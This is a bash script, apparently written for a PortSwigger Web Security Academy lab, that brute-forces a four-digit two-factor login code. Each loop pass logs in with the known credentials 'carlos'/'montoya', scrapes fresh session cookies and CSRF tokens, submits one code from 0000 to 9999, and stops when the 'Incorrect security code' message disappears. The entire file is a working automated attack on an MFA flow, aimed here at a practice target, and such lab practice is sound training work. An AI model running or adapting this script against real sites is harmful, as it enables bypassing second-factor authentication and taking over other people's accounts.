#!/bin/bash

login_url=https://0a510060047f2ad184069a8e00960090.web-security-academy.net/login
mfa_url=https://0a510060047f2ad184069a8e00960090.web-security-academy.net/login2
user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
content_type="Content-Type: application/x-www-form-urlencoded"

for otp in $(seq -w 0000 9999); do

    # Request the login page
    response1=$(curl -X GET $login_url -H "User-Agent: $user_agent" -H "Content-Type: $content_type" -v 2>&1)

    # echo "$response1"
    # Extract the first cookie from the set cookie header
    cookie1=$(echo "$response1" | grep 'set-cookie' | awk '{print $3}' | cut -d';' -f1 | cut -d'=' -f2)
    echo "cookie 1: $cookie1"

    # Extract the first csrf token from the body of the response
    csrf1=$(echo "$response1" | grep 'name="csrf" value="' | cut -d'"' -f6) 
    echo "csrf token 1: $csrf1"

    # Make a login request with the obtained cookie and token
    response2=$(curl $login_url -b "session=$cookie1" -d "csrf=$csrf1&username=carlos&password=montoya" -H "User-Agent: $user_agent" -H "Content-Type: $content_type" -v 2>&1)

    # echo "response 2: $response2"

    # Extract the second cookie from the set cookie header
    cookie2=$(echo "$response2" | grep 'set-cookie' | cut -d' ' -f3 | cut -d'=' -f2 | cut -d ';' -f1)
    echo "cookie 2: $cookie2"

    # Make a get request to the mfa code page using the second cookie
    response3=$(curl -X GET $mfa_url -b "session=$cookie2" -H "User-Agent: $user_agent" -H "Content-Type: $content_type" -v 2>&1)
    
    # echo "response 3: $response3"

    # Extract the csrf token from the page
    csrf2=$(echo "$response3" | grep 'name="csrf" value="' | cut -d'"' -f6)
    echo "csrf token 2: $csrf2"

    # Using the second cookie and token, make a post request with an otp code and capture the response and status code
    response4=$(curl -L $mfa_url -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -H "User-Agent: $user_agent" -H "Content-Type: $content_type" -w "%{http_code}" -o /home/deusx/BugBounty/Portswigger/Authentication/response_body.txt  -s)
    
    # Capture the body of the response from the temp file
    body=$(cat /home/deusx/BugBounty/Portswigger/Authentication/response_body.txt)

    # Check if the "Incorrect security code" message is present in the response body
    if echo "$body" | grep -q "Incorrect security code"; then
        error_message="Incorrect security code"
    else
        error_message="No error message detected"
    fi

    # Print the OTP, status code, and error message
    echo "Attempting OTP: $otp | Status Code: $response4 | Error Message: $error_message"

    # If no "Incorrect security code" is detected, assume it's the correct OTP
    if [[ "$error_message" == "No error message detected" ]]; then
        echo "Success! The correct OTP is: $otp"
        break
    fi
done
